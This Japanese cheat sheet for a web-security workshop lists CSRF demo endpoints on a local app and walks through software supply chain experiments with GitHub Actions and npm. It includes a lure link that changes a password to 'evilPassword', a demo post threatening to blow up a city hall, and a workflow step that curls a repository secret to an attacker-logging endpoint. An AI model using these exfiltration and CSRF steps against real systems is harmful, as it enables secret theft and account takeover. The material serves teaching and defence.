# チートシート

## おおまかな流れ

1. ウェブセキュリティの概要
   1. ユーザーの資産の列挙
   2. 攻撃方法の列挙（そのためのフレームワーク）
   3. 主要な脆弱性の概説
2. CSRF の例
   1. CWE での説明
   2. 他のフレームワークでの位置づけ
   3. ハンズオン： GET の例
   4. ハンズオン: cookie の説明と GET ログインの例
   5. ハンズオン： POST の例
   6. ハンズオン： CSRF TOKEN
   7. ハンズオン： 同一オリジンポリシーの確認
   8. ハンズオン： SameSite Cookie
   9. ハンズオン： Custom Header
   10. アプリケーションフレームワークでの対策
   11. まとめ：ブラウザへの注目
3.  ソフトウェア・サプライチェーン
   1. ハンズオン：ソフトウェア・サプライチェーンに乗っかってみる
      1. HonKit
      2. Amazon S3
      3. GitHub Actions
   2. ハンズオン： GitHub Actions Secret の実験
   3. 手元での実験
   4. まとめ：対処の難しさ

## エンドポイント一覧
以下のリポジトリを clone してください
https://github.com/sasakiy84/csrf-demo

1. シナリオ１
  1. この記事について、より詳細に書かれた内容が >> [ここ](http://localhost:3000/1-get-board?text=%E7%A7%81%E3%81%AF%E5%91%BC%E5%A3%B0%E5%B8%82%E5%BD%B9%E6%89%80%E3%82%92%E7%88%86%E7%A0%B4%E3%81%97%E3%81%BE%E3%81%99) << にあります
  1. http://localhost:3000/1-get-board?text=%E7%A7%81%E3%81%AF%E5%91%BC%E5%A3%B0%E5%B8%82%E5%BD%B9%E6%89%80%E3%82%92%E7%88%86%E7%A0%B4%E3%81%97%E3%81%BE%E3%81%99
1. GET ログイン確認
   1. http://localhost:3000/2-get-confirm
2. GET ログイン
   1. http://localhost:3000/2-get-login?name=wowow&password=whooo!
3. GET パスワード変更
   1. http://localhost:3000/2-get-password-change?newPassword=yourNewPassword
4. シナリオ2
   1. おめでとうございます！抽選に当選しました！！以下のリンクから景品を選んでください！！！！ >> [当選品選択ページ](http://localhost:3000/2-get-password-change?newPassword=evilPassword) <<
5. POST パスワード変更
   1. http://localhost:3000/3-post-password-change-dangerous
6. POST パスワード変更 evil
   1. http://127.0.0.1:4000/3-post-password-change-dangerous
7. CSRF Token パスワード変更
   1. http://localhost:3000/3-post-password-change-csrf-token
8. CSRF Token パスワード変更 evil
   1. http://127.0.0.1:4000/3-post-password-change-csrf-token
9. 同一オリジンポリシー XHR
   1. http://localhost:3000/3-post-password-change-with-xml-http-request
10. 同一オリジンポリシー XHR evil
   1. http://127.0.0.1:4000/3-post-password-change-with-xml-http-request
11. 同一オリジンポリシー iframe
   1. http://localhost:3000/3-post-password-change-with-iframe
12. 同一オリジンポリシー iframe evil
   1. http://127.0.0.1:4000/3-post-password-change-with-iframe
13. samesite cookies のセット
   1. http://localhost:3000/5-samesite-attr
14. samesite cookies の確認
   1. http://localhost:3000/5-check-cookies
15. ヘッダーの確認
   1. http://localhost:3000/4-prepare-custom-header
16. 独自ヘッダーのクロスオリジンリクエスト
   1. http://127.0.0.1:4000/4-prepare-custom-header


samesite 確認用の POST フォーム

<div>
<form id="form" action="http://localhost:3000/5-check-cookies" method="post">
  <button type="submit">submit</buttion>
</form>
</div>

## CSRF 参考リンク
- [Rails の CSRF 対策](https://railsguides.jp/security.html#csrf%E3%81%B8%E3%81%AE%E5%AF%BE%E5%BF%9C%E7%AD%96)
- [Laravel の CSRF 対策](https://laravel.com/docs/11.x/csrf)
- [Express の CSRF 対策](https://github.com/expressjs/csurf)

## honkit
- https://honkit.netlify.app/

## GitHub Actions
```yml
# .github/workflows/deploy.yaml
name: CI

on:
  push:
    branches:
      - master
      - main
  workflow_dispatch:

permissions:
  contents: write

env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

jobs:
  deploy:
    runs-on: ubuntu-22.04
    steps:
    - name: Checkout
      uses: actions/checkout@v4

    - name: Setup Node
      uses: actions/setup-node@v4
      with:
        node-version: '20'
    - name: Install dependencies
      run: npm install

    - name: Build Honkit
      run: npm run build
   
    - name: Upload to S3
      run: aws s3 sync --delete --region ap-northeast-1 ./_book s3://YOUR_PUBLISH_BUCKET
```

## GitHub secret 実験
自分の名前を `TEST_SECRET` という変数に入れておく

```yaml
# .github/secret-test.yaml
name: test 1
on:
  workflow_dispatch:

env:
  TEST_SECRET: ${{ secrets.TEST_SECRET }}

jobs:
  test1:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: echo $PWD
      - run: echo $TEST_SECRET
      - run: curl http://attacker-logging-endpoint.sasakiy84.net/aaa/$TEST_SECRET
      - run: npm i sasakiy84/dangerous-npm-repository-test
```

以下のコマンドで、ローカルに依存関係を追加する。
```bash
npm i sasakiy84/dangerous-npm-repository-test
```

そして、`node_modules/dangerous-npm-repository-test`　の中身を見る

## ソフトウェア・サプライチェーンの参考リンク
1. codecov
  1. https://about.codecov.io/security-update/
2. codecov のメルカリの発表
  1. https://about.mercari.com/press/news/articles/20210521_incident_report/
3. npm の lifecycle script
  1. https://docs.npmjs.com/cli/v10/using-npm/scripts
4. 実際の npm のライフサイクルスクリプトを使った攻撃事例
  1. https://www.bleepingcomputer.com/news/security/researcher-hacks-over-35-tech-firms-in-novel-supply-chain-attack/
